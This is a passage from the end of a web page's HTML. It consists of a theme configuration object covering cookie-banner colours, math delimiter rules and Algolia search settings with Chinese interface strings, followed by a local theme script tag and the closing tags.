来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"version":"v0.3.10-51d64cb1"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
